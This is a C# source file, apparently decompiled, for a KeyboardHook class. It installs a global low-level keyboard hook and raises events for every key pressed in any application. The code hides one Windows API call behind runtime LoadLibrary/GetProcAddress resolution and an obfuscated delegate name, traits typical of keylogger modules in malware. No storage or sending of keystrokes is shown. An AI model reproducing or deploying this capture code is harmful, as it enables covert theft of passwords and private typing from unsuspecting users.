using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook
{
	private struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scancode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	private delegate int TAE2345ASD(int hHook);

	private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	public delegate void KeyDownEventHandler(Keys Key);

	public delegate void KeyUpEventHandler(Keys Key);

	private const int HC_ACTION = 0;

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private const int WM_KEYUP = 257;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private static KeyDownEventHandler KeyDownEvent;

	private static KeyUpEventHandler KeyUpEvent;

	private static int KeyHook;

	private static KeyboardProcDelegate KeyHookDelegate;

	public static event KeyDownEventHandler KeyDown
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
		}
	}

	public static event KeyUpEventHandler KeyUp
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

	public KeyboardHook()
	{
		KeyHookDelegate = KeyboardProc;
		KeyHook = SetWindowsHookExA(13, KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
	}

	public T CreateAPI<T>(string name, string method)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(T));
	}

	private static int KeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		if (nCode == 0)
		{
			switch (wParam)
			{
			case 256:
			case 260:
				KeyDownEvent?.Invoke((Keys)lParam.vkCode);
				break;
			case 257:
			case 261:
				KeyUpEvent?.Invoke((Keys)lParam.vkCode);
				break;
			}
		}
		return 0;
	}

	protected override void Finalize()
	{
		TAE2345ASD tAE2345ASD = CreateAPI<TAE2345ASD>("user32", "UnhookWindowsHookEx");
		tAE2345ASD(KeyHook);
		base.Finalize();
	}
}
